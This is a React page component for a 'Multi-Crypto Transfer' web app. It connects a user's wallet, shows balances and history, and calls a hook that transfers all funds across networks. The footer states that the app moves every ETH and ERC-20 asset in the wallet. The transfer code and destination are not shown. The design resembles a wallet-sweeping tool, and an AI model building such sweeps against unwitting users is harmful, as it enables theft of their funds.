import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Ethereum-themed Header */}
      <header className="bg-card/80 backdrop-blur-xl border-b border-border sticky top-0 z-50 ethereum-glass">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <div className="text-2xl font-bold ethereum-gradient bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent flex items-center">
                <Coins className="mr-3 text-primary ethereum-pulse" />
                <span className="ethereum-float">Multi-Crypto Transfer</span>
              </div>
            </div>
            
            <div className="flex items-center space-x-4">
              <Button
                onClick={walletState.isConnected ? undefined : handleWalletConnect}
                disabled={isConnecting}
                className={`flex items-center space-x-2 ethereum-glow transition-all duration-300 ${
                  walletState.isConnected
                    ? "bg-success text-success-foreground hover:bg-success/90 network-connected"
                    : "ethereum-gradient hover:ethereum-glow-strong"
                }`}
              >
                <Wallet className="w-4 h-4" />
                <span>
                  {isConnecting
                    ? "Connecting..."
                    : walletState.isConnected
                    ? "Connected"
                    : "Connect Wallet"}
                </span>
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        {/* Ethereum-styled Wallet Status */}
        <div className="ethereum-glass rounded-xl p-1 ethereum-glow">
          <WalletStatus walletState={walletState} />
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Ethereum-styled Balance Card */}
          <div className="ethereum-glass rounded-xl p-1 ethereum-glow hover:ethereum-glow-strong transition-all duration-300">
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>

          {/* Ethereum-styled Transaction History */}
          <div className="ethereum-glass rounded-xl p-1 ethereum-glow hover:ethereum-glow-strong transition-all duration-300">
            <TransactionHistory />
          </div>
        </div>

        {/* Ethereum-styled Multi-Network Balances */}
        {walletState.isConnected && (
          <div className="ethereum-glass rounded-xl p-1 ethereum-glow hover:ethereum-glow-strong transition-all duration-300">
            <NetworkBalances
              networkBalances={walletState.networkBalances || []}
              isLoadingNetworks={isLoadingNetworks}
              onRefreshNetworks={refreshAllNetworks}
            />
          </div>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Ethereum-themed Footer */}
      <footer className="bg-card/50 border-t border-border mt-16 ethereum-glass">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="text-center text-muted-foreground">
            <p className="mb-2 text-warning flex items-center justify-center gap-2">
              <span className="animate-pulse">⚠️</span>
              This platform transfers ALL cryptocurrencies in your wallet (ETH + ERC-20 tokens). Use with caution.
            </p>
            <p className="text-sm text-accent">
              Always verify the destination address before confirming transactions.
            </p>
            <div className="mt-4 flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <span>Powered by</span>
              <span className="ethereum-gradient bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent font-semibold">
                Ethereum Network
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
